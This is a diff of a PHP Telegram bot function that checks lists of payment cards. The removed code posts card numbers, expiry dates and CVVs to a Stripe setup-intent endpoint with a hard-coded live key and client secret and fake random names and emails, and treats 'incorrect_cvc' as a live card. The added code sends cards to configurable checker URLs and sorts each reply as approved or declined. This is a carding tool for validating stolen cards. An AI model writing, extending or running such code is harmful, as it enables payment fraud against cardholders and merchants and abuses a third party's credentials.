@@ -2,26 +2,11 @@
 
 
 
-if(file_exists(getcwd().'./cookie.txt')){
- 	unlink('cookie.txt');
-}
-
-function getstr($url,$start,$fim,$n){
-	return explode($fim, explode($start, $url)[$n])[0];
-}
-
-function letras($size){
-    $basic = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-    $return= "";
-    for($count= 0; $size > $count; $count++){
-        $return.= $basic[rand(0, strlen($basic) - 1)];
-    }
-    return $return;
-}
 
 
 
-function ggtesta($msg){
+
+function chk($msg,$cmd){
 	$chatid = $msg['chat']['id'];
 
 
@@ -29,15 +14,39 @@ function ggtesta($msg){
 	$msgid = $msgen['message_id'];
 
 	$lista = $msg['text'];
-	$lista = substr($lista, 3);
+	$lista = substr($lista, strlen($cmd)+1);
     $lista = explode("\n", $lista);
 
-    if (sizeof($lista) > 5){
-	    die($msgen = bot('sendMessage' , array('chat_id' => $chatid , "text" => "sorry, but you crossed the gg limit (5)" , "reply_to_message_id" => $msg['message_id'])));
+
+    $confibot = file_get_contents('./confi.json');
+    $confibot = json_decode($confibot, true);
+
+
+    if ($confibot['chks'][$chatid][$cmd]){
+        $url = $confibot['chks'][$chatid][$cmd]['url'];
+        $mode = $confibot['chks'][$chatid][$cmd]['modeUse'];
+
+    }else if ($confibot['chks'][$chatid][$cmd]['default']){
+        $url = $confibot['chks']['default'][$cmd]['url'];
+        $mode = $confibot['chks']['default'][$cmd]['modeUse'];
+
+    }else{
+        die($msgen = bot('sendMessage' , array('chat_id' => $chatid , "text" => "Url not found" , "reply_to_message_id" => $msg['message_id'])));
+    }
+
+    if (sizeof($lista) > 10){
+	    die($msgen = bot('sendMessage' , array('chat_id' => $chatid , "text" => "sorry, but you crossed the limit (10)" , "reply_to_message_id" => $msg['message_id'])));
 
     }
-    
-    $msgen = bot('sendMessage' , array('chat_id' => $chatid , "text" => "Arguade um pouco !"));
+
+
+    if ($lista[0] == ''){
+         die($msgen = bot('sendMessage' , array('chat_id' => $chatid , "text" => $mode , "reply_to_message_id" => $msg['message_id'] , "parse_mode" => 'Markdown')));
+    }
+
+   
+  
+    $msgen = bot('sendMessage' , array('chat_id' => $chatid , "text" => "Arguade um pouco !", "reply_to_message_id" => $msg['message_id'] ));
 
     $msgid = json_decode($msgen ,true )['result']['message_id'];
     $apr = 0;
@@ -46,48 +55,62 @@ function ggtesta($msg){
     $lives = [];
     $status = 'parado';
     for ($i=0; $i < sizeof($lista) ; $i++) { 
+     
     	$lista2 = str_replace(array(" ",'/','!',":"), "|", trim($lista[$i]));
-		$cc = explode("|", $lista2)[0];
-		$mes = explode("|", $lista2)[1];
-		$ano = explode("|", $lista2)[2];
-		$cvv = explode("|", $lista2)[3];
+        if (empty($lista2)){
+            die($msgen = bot('sendMessage' , array('chat_id' => $chatid , "text" => $mode , "reply_to_message_id" => $msg['message_id'] , "parse_mode" => 'Markdown')));
+            break;
+        }
 
-		$email = letras(15).'@gmail.com';
-		$name = letras(6).' '.letras(6);
-    	$request = request(
-    		'https://api.stripe.com/v1/setup_intents/seti_0HW4XVnuL8NmlnsQS02iGhm3/confirm',
-    		'payment_method_data[type]=card&payment_method_data[billing_details][name]=gjghjghj&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=5b3282d6-515c-4c0e-b337-5e9034e6ecaa3572ce&payment_method_data[muid]=47384581-62fa-454f-8b5e-ce095d2a7de4fab61f&payment_method_data[sid]=8d43f735-c39d-4371-919e-827320b60d1b304393&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fe5627e51%3B+stripe-js-v3%2Fe5627e51&payment_method_data[time_on_page]=32137&payment_method_data[referrer]=https%3A%2F%2Fwww.jotform.com%2F&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_9SEidWzwPrgXRQ6VbGpuSXoY&client_secret=seti_0HW4XVnuL8NmlnsQS02iGhm3_secret_I6H53qROc632NdxQbBzQ67PRFJYoGxi',
-    		array(),
-    		false
-    	);
-
-    	$res = json_decode($request , true);
+        
+    	$request = request($url . $lista2,false);
+    	
     	$rand = ".....";
     	$ponto = substr($rand, 0,rand(0,strlen($rand)));
-    	if ($res['error']['code'] == "incorrect_cvc"){
+    	if (strpos($request, 'live') !==false || strpos($request, 'LIVE') !==false || strpos($request, 'Aprovada') !==false || strpos($request, 'APROVADA') !==false || strpos($request, 'aprovada') !==false || strpos($request, 'aprovada') !==false || strpos($request, '"status":200')!==false){
+
     		$apr ++;
-    		$reto = $res['error']['message'];
     		$status = "Aprovada";
-    		$lives[] = "Aprovada » $lista2 » Retorno: $reto";
-    	}else if ($res['error']['code']){
+
+            if (json_decode($request , true)){
+                $request = json_decode($request , true);
+                $result = '';
+                foreach ($request as $key => $value) {
+                    $result .= "$key : $value\n";
+
+                }
+            }else{
+                $result = $request;
+                   
+
+            }
+
+            
+
+    		$lives[] = $result;
+
+    	}else if (strpos($request, 'die') !==false || strpos($request, 'Die') !==false || strpos($request, 'Reprovada') !==false || strpos($request, 'REPROVADA') !==false || strpos($request, 'reprovada')!==false || strpos($request, "400") !==false){
     		$rep ++;
     		$status = "Reprovada";
     	}else{
     		$erros ++;
-    		$status = "error gatewary";
+    		$status = "error na api";
     	}
-
 
         bot("editMessageText",array("chat_id" => $chatid , "message_id" => $msgid, "text" => 
         	"<b>em fila: $lista2</b>\n<b>status</b>: $status $ponto
         	\n<b>Aprovadas:</b> $apr\n<b>Reprovadas:</b> $rep\n<b>Erros:</b> $erros" , "parse_mode" => "html"));
+        sleep(2);
     }
 
+
+ 
     $lives = implode($lives, "\n");
+
+
     bot("editMessageText",array("chat_id" => $chatid , "message_id" => $msgid, "text" => 
         	"$lives\n\n<b>status</b>: Finalizado!
         	\n<b>Aprovadas:</b> $apr\n<b>Reprovadas:</b> $rep\n<b>Erros:</b> $erros" , "parse_mode" => "html"));
 
-
-
 }
+
